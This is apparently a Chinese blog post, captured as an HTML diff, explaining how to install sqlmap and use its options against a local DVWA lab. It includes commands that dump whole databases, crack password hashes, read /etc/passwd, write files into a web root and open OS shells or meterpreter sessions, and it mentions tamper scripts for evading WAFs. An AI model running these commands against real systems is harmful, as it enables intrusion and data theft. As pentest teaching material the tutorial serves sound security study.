@@ -1,0 +1,222 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>SQLmap安装和使用 - Daben's Blog</title><meta name=Description content="This is my cool site"><meta property="og:title" content="SQLmap安装和使用"><meta property="og:description" content><meta property="og:type" content="article"><meta property="og:url" content="https://senmer.github.io/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-26T21:17:29+08:00"><meta property="article:modified_time" content="2023-03-26T21:17:29+08:00"><meta property="og:site_name" content="My cool site"><meta name=twitter:card content="summary"><meta name=twitter:title content="SQLmap安装和使用"><meta name=twitter:description content><meta name=application-name content="My cool site"><meta name=apple-mobile-web-app-title content="My cool site"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://senmer.github.io/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/><link rel=prev href=https://senmer.github.io/posts/sql_injection/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"SQLmap安装和使用","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/senmer.github.io\/posts\/scanning_tools\/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8\/"},"genre":"posts","wordcount":6989,"url":"https:\/\/senmer.github.io\/posts\/scanning_tools\/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8\/","datePublished":"2023-03-26T21:17:29+08:00","dateModified":"2023-03-26T21:17:29+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"作者"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><script>var _hmt=_hmt||[];(function(){var e,t=document.createElement("script");t.src="https://hm.baidu.com/hm.js?63ce39500f9db1110f1c08d9ed53fa96",e=document.getElementsByTagName("script")[0],e.parentNode.insertBefore(t,e)})()</script><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Daben's Blog">Daben's Blog</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Daben's Blog">Daben's Blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SQLmap安装和使用</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>作者</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-03-26>2023-03-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;约 6989 字&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;预计阅读 14 分钟&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>目录</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#1-实验环境>1 实验环境</a></li><li><a href=#2-sqlmap简介>2 SQLmap简介</a></li><li><a href=#2-下载及安装>2 下载及安装</a><ul><li><a href=#21-linux>2.1 Linux</a></li><li><a href=#22-windows>2.2 windows</a></li></ul></li><li><a href=#3-参数详解>3 参数详解</a><ul><li><a href=#31-target目标>3.1 Target：目标</a></li><li><a href=#32-request请求设置>3.2 Request：请求设置</a></li><li><a href=#33-optimization优化>3.3 Optimization：优化</a></li><li><a href=#34-injection注入>3.4 Injection：注入</a></li><li><a href=#35-detection探测等级>3.5 Detection：探测等级</a></li><li><a href=#36-enumeration枚举数据>3.6 Enumeration：枚举数据</a></li><li><a href=#37-brute-force爆破>3.7 Brute force：爆破</a></li><li><a href=#38-file-system-access访问文件系统>3.8 File system access：访问文件系统</a></li><li><a href=#39-operating-system-access访问操作系统>3.9 Operating system access：访问操作系统</a></li></ul></li><li><a href=#4-实际利用dvwa>4 实际利用(dvwa)</a></li></ul></nav></div></div><div class=content id=content><h2 id=1-实验环境>1 实验环境</h2><table><thead><tr><th>软件名称</th><th>版本</th><th>部署方式</th><th>IP</th></tr></thead><tbody><tr><td>SQLmap</td><td>latest</td><td>源码部署</td><td>172.31.5.7</td></tr><tr><td>DVWA</td><td>latest</td><td>docker run -d -p 80:80 &ndash;name dvwa docker.io/sagikazarmark/dvwa</td><td>172.31.5.7</td></tr></tbody></table><h2 id=2-sqlmap简介>2 SQLmap简介</h2><blockquote><p>官方网站：http://sqlmap.org/，
+下载地址：https://github.com/sqlmapproject/sqlmap/zipball/master</p></blockquote><p>Sqlmap是一款开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令。</p><p>sqlmap支持的数据库有：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-tex data-lang=tex><span class=line><span class=cl>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
+</span></span></code></pre></div><p>sqlmap支持五种不同的注入模式：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-tex data-lang=tex><span class=line><span class=cl>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
+</span></span><span class=line><span class=cl>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页
+</span></span><span class=line><span class=cl>面返回时间是否增加）来判断。
+</span></span><span class=line><span class=cl>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+</span></span><span class=line><span class=cl>4、联合查询注入，可以使用union的情况下的注入。
+</span></span><span class=line><span class=cl>5、堆查询注入，可以同时执行多条语句的执行时的注入。
+</span></span></code></pre></div><h2 id=2-下载及安装>2 下载及安装</h2><h3 id=21-linux>2.1 Linux</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git clone --depth <span class=m>1</span> https://github.com/sqlmapproject/sqlmap.git sqlmap
+</span></span><span class=line><span class=cl><span class=nb>cd</span> sqlmap
+</span></span><span class=line><span class=cl>python sqlmap.py --update <span class=c1># 更新</span>
+</span></span><span class=line><span class=cl>python sqlmap.py -hh <span class=c1># 查看帮助信息</span>
+</span></span></code></pre></div><h3 id=22-windows>2.2 windows</h3><p>官网下载sqlmap的压缩包，解压后即可使用。但需要一些组件包的支持，需要有python2.7.x或者2.6.x环境支持。</p><h2 id=3-参数详解>3 参数详解</h2><h3 id=31-target目标>3.1 Target：目标</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>-u URL, --url<span class=o>=</span>URL 目标URL <span class=o>(</span>e.g.<span class=s2>&#34;http://www.site.com/vuln.php?id=1&#34;</span><span class=o>)</span>，使用-u或者--url
+</span></span><span class=line><span class=cl>-d DIRECT 直接连接数据库的连接字符串
+</span></span><span class=line><span class=cl>-l LOGFILE 从Burp或者WebScarab代理日志文件中分析目标
+</span></span><span class=line><span class=cl>-x SITEMAPURL 从远程网站地图（sitemap.xml）文件来解析目标
+</span></span><span class=line><span class=cl>-m BULKFILE 将目标地址保存在文件中，一行为一个URL地址进行批量检测。
+</span></span><span class=line><span class=cl>-g GOOGLEDORK 从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）
+</span></span><span class=line><span class=cl>-c CONFIGFILE 从配置ini文件中加载选项
+</span></span><span class=line><span class=cl>-r REQUESTFILE 从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可
+</span></span><span class=line><span class=cl>以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个--forcessl参数来使用，或者可以在Host头后门加上:443
+</span></span></code></pre></div><p><strong>目标URL</strong>
+参数：-u或者&ndash;url
+格式：http(s)://targeturl<sup>:port</sup>/<sub>…</sub>
+例如：python sqlmap.py -u &ldquo;<a href="http://www.target.com/vuln.php?id=1%22" target=_blank rel="noopener noreffer">http://www.target.com/vuln.php?id=1"</a> -f &ndash;banner &ndash;dbs &ndash;users</p><p><strong>从文本中获取多个目标扫描</strong></p><p>参数：-m</p><p>文件中保存url格式如下，sqlmap会一个一个检测</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-tex data-lang=tex><span class=line><span class=cl>www.test1.com/vuln1.php?q=student
+</span></span><span class=line><span class=cl>www.test2.com/vuln2.asp?id=1
+</span></span><span class=line><span class=cl>www.test3.com/vuln3/id/1*
+</span></span></code></pre></div><p>从文件中加载HTTP请求</p><p>参数：-r</p><p>sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。
+比如文本文件内如下：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>POST/students.php HTTP/1.1
+</span></span></span><span class=line><span class=cl><span class=err>Host:www.magedu.com
+</span></span></span><span class=line><span class=cl><span class=err>User-Agent:Mozilla/4.0
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>id=1
+</span></span></span></code></pre></div><p>当请求是HTTPS的时候，需要配合&ndash;force-ssl参数来使用，或者可以在Host头后面加上:443</p><h3 id=32-request请求设置>3.2 Request：请求设置</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>--method：指定请求方法
+</span></span><span class=line><span class=cl>--data：把数据以POST方式提交
+</span></span><span class=line><span class=cl>--param：当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数
+</span></span><span class=line><span class=cl>--cookie：设置cookie，提交请求的时候附带所设置的cookie
+</span></span><span class=line><span class=cl>--load-cookies：从文件获取cookie
+</span></span><span class=line><span class=cl>--user-agent：可以使用–user-anget参数来修改
+</span></span><span class=line><span class=cl>--headers：可以通过–headers参数来增加额外的http头
+</span></span><span class=line><span class=cl>--proxy：设置代理，可以避免本机地址被封禁
+</span></span><span class=line><span class=cl>--delay：可以设定两个HTTP<span class=o>(</span>S<span class=o>)</span>请求间的延迟 防止发送过快导致被封ip
+</span></span><span class=line><span class=cl>--random-agent：使用–random-agnet参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。
+</span></span><span class=line><span class=cl>--referer：在请求目标的时候可以自己伪造请求包中的referer
+</span></span><span class=line><span class=cl>–-level参数设定为3或者3以上的时候会尝试对referer注入。
+</span></span></code></pre></div><p>参数：&ndash;data</p><p>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST参数。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python sqlmap.py -u <span class=s2>&#34;http://www.magedu.com/students.php&#34;</span> --data<span class=o>=</span><span class=s2>&#34;id=1&#34;</span> -f --banner --dbs --users
+</span></span></code></pre></div><p>利用正则过滤目标网址</p><p>参数：&ndash;scope</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python sqlmap.py -l burp_http.log --scope<span class=o>=</span><span class=s2>&#34;(www)?\.target\.(com|net|org)&#34;</span>
+</span></span></code></pre></div><p>避免过多的错误请求被屏蔽</p><p>参数：&ndash;safe-url,&ndash;safe-freq</p><p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致后续无法进行测试。
+绕过这个策略有两种方式：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-tex data-lang=tex><span class=line><span class=cl>--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。
+</span></span><span class=line><span class=cl>--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。
+</span></span></code></pre></div><h3 id=33-optimization优化>3.3 Optimization：优化</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-tex data-lang=tex><span class=line><span class=cl>-o 开启所有优化开关
+</span></span></code></pre></div><h3 id=34-injection注入>3.4 Injection：注入</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bas data-lang=bas><span class=line><span class=cl><span class=o>-</span><span class=vg>p</span><span class=err>：设置想要测试的参数</span>
+</span></span><span class=line><span class=cl><span class=o>--</span><span class=vg>skip</span><span class=err>：不想要测试的参数可以通过</span><span class=w> </span><span class=vg>skip</span><span class=err>设置跳过</span>
+</span></span><span class=line><span class=cl><span class=o>--</span><span class=vg>dbms</span><span class=err>：指定数据库</span><span class=w> </span><span class=err>节省</span><span class=vg>sqlmap</span><span class=err>自己检测的时间</span>
+</span></span><span class=line><span class=cl><span class=o>--</span><span class=vg>os</span><span class=err>：指定数据库服务系统</span><span class=w> </span><span class=err>节省</span><span class=vg>sqlmap</span><span class=err>自己检测的时间</span>
+</span></span><span class=line><span class=cl><span class=o>--</span><span class=vg>tamper</span><span class=err>：使用</span><span class=vg>sqlmap</span><span class=err>自带的</span><span class=vg>tamper</span><span class=err>（脚本），或者自己写的</span><span class=vg>tamper</span><span class=err>，来混淆</span><span class=vg>payload</span><span class=err>，通常用来绕过</span><span class=vg>waf</span><span class=err>和</span><span class=vg>ips</span>
+</span></span></code></pre></div><p>测试参数</p><p>参数：-p, &ndash;skip</p><p>sqlmap默认测试所有的GET和POST参数，当&ndash;level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> -p <span class=s2>&#34;id,user-anget&#34;</span> 
+</span></span></code></pre></div><p>当你使用&ndash;level的值很大但是有个别参数不想测试的时候可以使用&ndash;skip参数。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>--skip<span class=o>=</span><span class=s2>&#34;user-agent,referer&#34;</span>  
+</span></span></code></pre></div><p>在有些时候web服务器使用了伪静态，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加* sqlmap将会测试value1的位置是否可注入。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python sqlmap.py -u <span class=s2>&#34;http://magedu/param1/value1*/param2/value2/&#34;</span>
+</span></span></code></pre></div><p>指定数据库服务器系统</p><p>参数：&ndash;os
+默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。</p><h3 id=35-detection探测等级>3.5 Detection：探测等级</h3><pre tabindex=0><code>--level=LEVEL 执行测试的等级（1-5，默认为1）
+--risk：（*慎用此参数有风险）， 共有四个风险等级（0-3），默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。
+</code></pre><p><strong>探测等级</strong></p><p>参数：&ndash;level
+共有五个等级，默认为1，最大为5，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。</p><p>这个参数不仅影响使用哪些payload，同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-gent/Referer头在level为3的时候就会测试。</p><p>总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p><p>**风险等级 **</p><p>参数：&ndash;risk</p><p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p><p>在有些时候，例如在UPDATE/DELETE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p><p>测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。</p><h3 id=36-enumeration枚举数据>3.6 Enumeration：枚举数据</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>-a, --all 获取所有信息
+</span></span><span class=line><span class=cl>-b, --banner 获取数据库管理系统的标识
+</span></span><span class=line><span class=cl>--current-user 获取数据库管理系统当前用户
+</span></span><span class=line><span class=cl>--current-db 获取数据库管理系统当前数据库
+</span></span><span class=line><span class=cl>--hostname 获取数据库服务器的主机名称
+</span></span><span class=line><span class=cl>--is-dba 检测DBMS当前用户是否DBA（数据库管理员）
+</span></span><span class=line><span class=cl>--users 枚举数据库管理系统用户
+</span></span><span class=line><span class=cl>--passwords 枚举数据库管理系统用户密码哈希
+</span></span><span class=line><span class=cl>--privileges 枚举数据库管理系统用户的权限
+</span></span><span class=line><span class=cl>--roles 枚举数据库管理系统用户的角色
+</span></span><span class=line><span class=cl>--dbs 枚举数据库管理系统数据库
+</span></span><span class=line><span class=cl>--tables 枚举的DBMS数据库中的表
+</span></span><span class=line><span class=cl>--columns 枚举DBMS数据库表列
+</span></span><span class=line><span class=cl>--schema 枚举数据库架构
+</span></span><span class=line><span class=cl>--count 检索表的项目数
+</span></span><span class=line><span class=cl>--dump 转储数据库表项，即下载
+</span></span><span class=line><span class=cl>--dump-all 转储数据库所有表项
+</span></span><span class=line><span class=cl>--search 搜索列（S），表（S）和/或数据库名称（S）
+</span></span><span class=line><span class=cl>--comments 获取DBMS注释
+</span></span><span class=line><span class=cl>-D DB 要进行枚举的指定数据库名
+</span></span><span class=line><span class=cl>-T TBL DBMS数据库表枚举
+</span></span><span class=line><span class=cl>-C COL DBMS数据库表列枚举
+</span></span><span class=line><span class=cl>-X EXCLUDECOL DBMS数据库表不进行枚举
+</span></span><span class=line><span class=cl>-U USER 用来进行枚举的数据库用户
+</span></span><span class=line><span class=cl>--exclude-sysdbs 枚举表时排除系统数据库
+</span></span><span class=line><span class=cl>--pivot-column<span class=o>=</span>P.. Pivot columnname
+</span></span><span class=line><span class=cl>--where<span class=o>=</span>DUMPWHERE Use WHEREcondition <span class=k>while</span> table dumping
+</span></span><span class=line><span class=cl>--start<span class=o>=</span>LIMITSTART 获取第一个查询输出数据位置
+</span></span><span class=line><span class=cl>--stop<span class=o>=</span>LIMITSTOP 获取最后查询的输出数据
+</span></span><span class=line><span class=cl>--first<span class=o>=</span>FIRSTCHAR 第一个查询输出字的字符获取
+</span></span><span class=line><span class=cl>--last<span class=o>=</span>LASTCHAR 最后查询的输出字字符获取
+</span></span><span class=line><span class=cl>--sql-query<span class=o>=</span>QUERY 要执行的SQL语句
+</span></span><span class=line><span class=cl>--sql-shell 提示交互式SQL的shell
+</span></span><span class=line><span class=cl>--sql-file<span class=o>=</span>SQLFILE 要执行的SQL文件
+</span></span></code></pre></div><p><strong>标志</strong>
+参数：-b,&ndash;banner
+大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量
+@@version，这主要取决于是什么数据库。</p><p><strong>当前用户</strong>
+参数：-current-user
+在大多数据库中可以获取到管理数据的用户。</p><p><strong>当前数据库</strong>
+参数：&ndash;current-db
+返还当前连接的数据库。</p><p><strong>当前用户是否为管理员</strong>
+参数：&ndash;is-dba
+判断当前的用户是否为管理员，是的话会返回True。</p><p><strong>列出数据库管理用户</strong></p><p>参数：&ndash;users</p><p>当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</p><p><strong>列出并破解数据库用户的hash</strong>
+参数：&ndash;passwords
+当前用户有权限读取包含用户密码的表的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python sqlmap.py -u <span class=s2>&#34;http://magedu/sqlmap/pgsql/students.php?id=1&#34;</span> --passwords -
+</span></span><span class=line><span class=cl>v1
+</span></span></code></pre></div><p><strong>列出数据库管理员权限</strong>
+参数：&ndash;privileges
+当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你
+哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。</p><p><strong>列出数据库管理员角色</strong>
+参数：&ndash;roles
+当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。仅适用于当前数据库是Oracle的时候。</p><p><strong>列出数据库系统的数据库</strong>
+参数：&ndash;dbs
+当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</p><p><strong>列举数据库表</strong>
+参数：&ndash;tables,&ndash;exclude-sysdbs,-D
+当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。
+如果你不提供-D参数来指定一个数据库的时候，sqlmap会列出数据库所有库的所有表。
+&ndash;exclude-sysdbs参数是指可排除系统数据库。
+需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。</p><p><strong>列举数据库表中的字段</strong>
+参数：&ndash;columns,-C,-T,-D
+当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。
+如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p><h3 id=37-brute-force爆破>3.7 Brute force：爆破</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>--common-tables 检查存在共同表
+</span></span><span class=line><span class=cl>--common-columns 检查存在共同列
+</span></span><span class=line><span class=cl>User-defined <span class=k>function</span> injection（用户自定义函数注入）：
+</span></span><span class=line><span class=cl>--udf-inject 注入用户自定义函数
+</span></span><span class=line><span class=cl>--shared-lib<span class=o>=</span>SHLIB 共享库的本地路径
+</span></span></code></pre></div><h3 id=38-file-system-access访问文件系统>3.8 File system access：访问文件系统</h3><pre tabindex=0><code>--file-read=RFILE 从后端的数据库管理系统读取文件
+--file-write=WFILE 上传文件到后端的数据库管理系统
+--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
+</code></pre><p><strong>从数据库服务器中读取文件</strong>
+参数：&ndash;file-read
+当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python sqlmap.py -u <span class=s2>&#34;http://127.0.0.1:8080/vulnerabilities/sqli/?
+</span></span></span><span class=line><span class=cl><span class=s2>id=1&amp;Submit=Submit#&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir;
+</span></span></span><span class=line><span class=cl><span class=s2>security=low&#34;</span> -p id --file-read <span class=s2>&#34;/etc/passwd&#34;</span>
+</span></span></code></pre></div><p>**把文件上传到数据库服务器中 **</p><p>参数：&ndash;file-write,&ndash;file-dest
+当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python sqlmap.py -u <span class=s2>&#34;http://127.0.0.1:8080/vulnerabilities/sqli/?
+</span></span></span><span class=line><span class=cl><span class=s2>id=1&amp;Submit=Submit#&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir;
+</span></span></span><span class=line><span class=cl><span class=s2>security=low&#34;</span> -p id
+</span></span><span class=line><span class=cl>python sqlmap.py -u <span class=s2>&#34;http://127.0.0.1:8080/vulnerabilities/sqli/?
+</span></span></span><span class=line><span class=cl><span class=s2>id=1&amp;Submit=Submit#&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir;
+</span></span></span><span class=line><span class=cl><span class=s2>security=low&#34;</span> -p id --file-write<span class=o>=</span><span class=s2>&#34;/opt/test_code/user.txt&#34;</span> --filedest<span class=o>=</span><span class=s2>&#34;/var/www/html/user.txt&#34;</span>
+</span></span></code></pre></div><h3 id=39-operating-system-access访问操作系统>3.9 Operating system access：访问操作系统</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>--os-cmd<span class=o>=</span>OSCMD 执行操作系统命令
+</span></span><span class=line><span class=cl>--os-shell 交互式的操作系统的shell
+</span></span><span class=line><span class=cl>--os-pwn 获取一个OOB shell，meterpreter或VNC
+</span></span><span class=line><span class=cl>--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
+</span></span><span class=line><span class=cl>--os-bof 存储过程缓冲区溢出利用
+</span></span><span class=line><span class=cl>--priv-esc 数据库进程用户权限提升
+</span></span><span class=line><span class=cl>--msf-path<span class=o>=</span>MSFPATH Metasploit Framework 本地的安装路径
+</span></span><span class=line><span class=cl>--tmp-path<span class=o>=</span>TMPPATH 远程临时文件目录的绝对路径
+</span></span></code></pre></div><p><strong>获取整个表的数据</strong>
+参数：&ndash;dump,-C,-T,-D,&ndash;start,&ndash;stop,&ndash;first,&ndash;last
+如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取整个表的所有内容。
+使用-D,-T参数指定想要获取哪个库的哪个表，不使用-D参数时，默认使用当前库。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python sqlmap.py -u <span class=s2>&#34;http://magedu/sqlmap/firebird/students.php?id=1&#34;</span> --dump -T
+</span></span><span class=line><span class=cl>users
+</span></span></code></pre></div><p>可以获取指定库中的所有表的内容，只用-dump跟-D参数（不使用-T与-C参数）。也可以用-dump跟-C获取指定的字段内容。</p><p>sqlmap为每个表生成了一个CSV文件。</p><p>如果你只想获取一段数据，可以使用&ndash;start和&ndash;stop参数，例如，你只想获取第一段数据可以使用&ndash;stop1，如果想获取第二段与第三段数据，使用参数 &ndash;start 1 &ndash;stop 3。
+也可以用&ndash;first与&ndash;last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中第三个字符到第五个字符的内容，使用&ndash;first 3 &ndash;last 5，只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。</p><p><strong>获取所有数据库表的内容</strong>
+参数：&ndash;dump-all,&ndash;exclude-sysdbs
+使用&ndash;dump-all参数获取所有数据库表的内容，可同时加上&ndash;exclude-sysdbs排除系统数据库，只获取用户数据库的表，即业务数据。</p><p><strong>搜索字段，表，数据库</strong>
+参数：&ndash;search,-C,-T,-D
+&ndash;search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。
